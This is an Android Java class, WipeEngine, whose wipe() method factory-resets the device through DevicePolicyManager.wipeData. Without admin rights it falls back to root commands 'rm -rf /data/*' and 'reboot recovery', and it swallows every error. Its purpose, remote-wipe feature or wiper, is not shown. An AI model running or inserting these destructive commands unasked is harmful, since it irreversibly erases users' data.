package com.wuzenx.engine;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import com.wuzenx.services.AdminReceiver;

public class WipeEngine {
    private Context context;

    public WipeEngine(Context context) { this.context = context; }

    public void wipe() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) 
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(context, AdminReceiver.class);
            
            if (dpm.isAdminActive(cn)) {
                // Wipe all data (factory reset)
                dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE, 0);
            } else {
                // Fallback: try root command
                try {
                    Runtime.getRuntime().exec(new String[]{"su", "-c", "rm -rf /data/*"});
                    Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot recovery"});
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {
            try { Runtime.getRuntime().exec("reboot"); } catch (Exception ignored2) {}
        }
    }
}
